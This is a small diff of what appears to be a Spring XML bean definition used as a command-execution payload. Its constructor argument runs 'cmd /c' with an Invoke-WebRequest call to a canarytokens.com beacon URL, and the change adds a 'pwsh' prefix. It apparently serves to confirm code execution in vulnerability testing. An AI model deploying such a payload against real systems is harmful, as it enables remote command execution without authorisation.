@@ -8,7 +8,7 @@
             <list>
                 <value>cmd</value>
                 <value>/c</value>
-                <value>Invoke-WebRequest "http://canarytokens.com/articles/about/t16gdpxo8gzxdyxczhvvpeiye/contact.php"</value>
+                <value>pwsh Invoke-WebRequest "http://canarytokens.com/articles/about/t16gdpxo8gzxdyxczhvvpeiye/contact.php"</value>
             </list>
             </constructor-arg>
         </bean>
